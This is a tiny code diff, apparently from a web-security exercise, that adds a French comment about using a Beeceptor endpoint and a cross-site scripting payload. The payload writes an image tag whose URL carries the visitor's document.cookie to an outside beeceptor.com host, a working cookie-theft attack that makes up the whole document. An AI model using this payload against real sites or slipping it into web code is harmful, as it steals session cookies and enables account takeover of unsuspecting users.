@@ -1,0 +1,3 @@
+
+// On utilise un créateur d'endpoint (beeceptor)
+<script>document.write('<img src="https://zidane.free.beeceptor.com/bonjour?cookie=' + document.cookie + '" />')</script>
